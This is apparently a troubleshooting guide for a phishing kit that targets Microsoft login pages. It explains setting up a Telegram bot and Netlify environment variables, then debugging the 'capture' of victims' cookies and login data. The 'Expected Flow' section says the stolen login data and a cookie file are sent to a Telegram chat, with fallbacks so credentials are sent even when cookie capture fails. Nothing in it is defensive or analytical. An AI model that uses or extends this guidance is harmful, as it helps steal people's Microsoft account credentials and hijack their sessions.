# Telegram Functionality Troubleshooting Guide

## 🚨 Common Issues and Solutions

### 1. **Missing Environment Variables** (Most Common Issue)

**Problem**: Telegram bot token and chat ID are not configured properly.

**Solution**:
1. Create a Telegram bot:
   - Message `@BotFather` on Telegram
   - Send `/newbot` and follow instructions
   - Copy the bot token

2. Get your chat ID:
   - Message `@userinfobot` on Telegram
   - Copy your chat ID

3. Set environment variables:
   - For local development: Create `.env` file with:
     ```
     TELEGRAM_BOT_TOKEN=your_bot_token_here
     TELEGRAM_CHAT_ID=your_chat_id_here
     ```
   - For Netlify deployment: Add these in your Netlify dashboard under Environment Variables

### 2. **Cookie Capture Issues**

**Problem**: Cookies are not being captured due to browser security restrictions.

**Solutions**:
- The app now includes fallback mechanisms for when cookies aren't available
- Enhanced logging shows exactly what cookies are captured
- Session data is captured as backup even when cookies fail

### 3. **Network/Connectivity Issues**

**Problem**: Requests to Telegram API failing or timing out.

**Solutions**:
- Added 30-second timeout to prevent hanging
- Enhanced error logging to identify specific failures
- Fallback text messages when file uploads fail

### 4. **Domain Restrictions**

**Problem**: Code hardcoded to only work with Microsoft domains.

**Note**: This is by design for this specific application, but the code now:
- Provides better error messages when run on other domains
- Captures session data even without proper cookies
- Logs all attempts for debugging

## 🔧 Debug Tools

### Using the Built-in Debugger

1. Open browser console (F12)
2. Run: `window.telegramDebugger.runFullDiagnostic()`
3. Check the detailed output for specific issues

### Manual Testing

1. **Test Telegram Function**:
   ```javascript
   window.telegramDebugger.testTelegramFunction()
   ```

2. **Check Cookie Capture**:
   ```javascript
   window.telegramDebugger.checkCookies()
   ```

3. **Verify Environment**:
   ```javascript
   window.telegramDebugger.checkEnvironment()
   ```

## 📋 Step-by-Step Troubleshooting

### Step 1: Verify Configuration
1. Check if environment variables are set in Netlify dashboard
2. Verify bot token format (should start with numbers followed by colon)
3. Verify chat ID is correct (usually starts with negative number for groups)

### Step 2: Test Basic Connectivity
1. Open browser console
2. Run: `window.telegramDebugger.testTelegramFunction()`
3. Check if you receive a test message in Telegram

### Step 3: Check Cookie Capture
1. Navigate to a Microsoft login page
2. Run: `window.telegramDebugger.checkCookies()`
3. Verify cookies are being captured

### Step 4: Monitor Network Requests
1. Open Network tab in browser developer tools
2. Filter for "sendTelegram"
3. Check request/response for errors

## 🐛 Common Error Messages and Fixes

### "Telegram configuration missing"
- **Cause**: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set
- **Fix**: Set environment variables in Netlify dashboard

### "No cookies found"
- **Cause**: Cookie capture failed
- **Fix**: App now continues anyway and sends login data without cookies

### "sendTelegram failed: 401"
- **Cause**: Invalid bot token
- **Fix**: Verify bot token is correct and bot is active

### "sendTelegram failed: 400"
- **Cause**: Invalid chat ID or message format
- **Fix**: Verify chat ID is correct, try messaging the bot first

### "Main message failed"
- **Cause**: Telegram API returned error
- **Fix**: Check bot permissions and chat accessibility

## 📱 Telegram Bot Setup Checklist

- [ ] Created bot with @BotFather
- [ ] Saved bot token
- [ ] Started conversation with bot (sent `/start`)
- [ ] Obtained chat ID from @userinfobot
- [ ] Added environment variables to Netlify
- [ ] Redeployed site after adding variables
- [ ] Tested with debug tools

## 🔍 Log Locations

### Browser Console
- All debug information appears in browser console (F12)
- Look for messages starting with 🔍, ✅, ❌, or 📤

### Netlify Function Logs
- Go to Netlify dashboard → Functions → sendTelegram → Logs
- Check for runtime errors and API responses

### Telegram Bot Logs
- Message your bot directly to test if it's responding
- Check if bot has necessary permissions

## 💡 Pro Tips

1. **Test the bot independently**: Send a message directly to your bot to ensure it's working
2. **Use chat groups**: Create a private group, add your bot, and use the group chat ID
3. **Check rate limits**: Telegram has API rate limits, ensure you're not hitting them
4. **Verify permissions**: Bot needs permission to send messages to the chat/user
5. **Monitor deployments**: Redeploy after changing environment variables

## 🆘 Still Having Issues?

If none of the above solutions work:

1. Run the full diagnostic: `window.telegramDebugger.runFullDiagnostic()`
2. Check the results in `localStorage.getItem('telegram_diagnostic_results')`
3. Look for specific error messages in the Netlify function logs
4. Verify all environment variables are set correctly
5. Test with a different Telegram bot/chat ID to isolate the issue

## 📊 Expected Flow

1. User interacts with application
2. Cookies and login data are captured
3. Data is sent to `/.netlify/functions/sendTelegram`
4. Function validates environment variables
5. Function formats and sends message to Telegram
6. Function uploads cookie file as document
7. Success/failure is logged and returned

The enhanced error handling and logging should now provide clear indicators of where the process is failing.